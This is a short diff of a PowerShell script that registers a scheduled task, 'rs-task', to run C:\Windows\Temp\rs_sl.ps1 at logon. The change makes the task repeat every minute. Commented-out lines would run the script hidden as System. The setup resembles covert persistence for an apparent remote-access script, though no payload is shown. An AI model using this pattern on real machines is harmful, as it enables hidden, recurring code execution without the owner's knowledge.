@@ -13,7 +13,7 @@ if($taskExists) {
    Write-Output "Creating task...";
    #C:\Windows\System32\schtasks.exe /create /tn rs-task /tr "powershell -NoLogo -WindowStyle hidden -file C:\Windows\Temp\rs_sl.ps1" /sc minute /mo 1 /ru System
    $action = New-ScheduledTaskAction -Execute "C:\Windows\Temp\rs_sl.ps1";
-   $trigger = New-ScheduledTaskTrigger -AtLogOn;
+   $trigger = New-ScheduledTaskTrigger -AtLogOn -RepetitionDuration (New-TimeSpan -Minutes 1);
    $principal = New-ScheduledTaskPrincipal -UserId (Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object -expand UserName);
    $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal;
    #$settings = New-ScheduledTaskSettingsSet -Hidden $true;
